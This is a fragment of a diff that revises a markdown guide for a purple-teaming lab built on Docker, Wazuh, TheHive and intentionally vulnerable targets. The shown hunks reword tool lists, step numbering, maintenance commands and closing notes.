-  - TheHive, Cortex, MISP.
-  - n8n: Wazuh alert → disable FTP.
+  - TheHive, Cortex, n8n (disable FTP).
 - **Collaboration**:
   - Red team shares FTP steps.
-  - Blue team updates Wazuh FTP monitoring.
+  - Blue team updates Wazuh FTP rules.
 
 ---
 
-#### Step 8: Maintenance
+#### Step 9: Maintenance
 1. **Stop**:
    ```powershell
    docker-compose down
@@ -864,16 +818,16 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
   ```bash
   apt update && apt upgrade -y
   ```
-- **Resources**: 
-  Stop unused services:
+- **Resources**:
+  Stop services:
   ```powershell
   docker-compose stop <service>
   ```
 
 #### Notes
-- Exercises leverage Metasploit and vulnerable setups for realistic attack chains.
-- DVWA focuses on web attacks; Metasploitable3 offers diverse services.
+- The vuln-os container consolidates vulnerable services, simplifying the attack surface while maintaining realism.
+- Exercises leverage Metasploit for your interest.
 - Security Onion is optional due to resource demands.
-- Expand with custom Suricata/Wazuh rules or additional targets.
+- Expand with custom Wazuh/Suricata rules or additional services.
 
-This guide provides a fully functional purple teaming lab with detailed exercises for attack and defense practice. 
+This guide provides a streamlined purple teaming lab with a single vulnerable target and comprehensive exercises. 
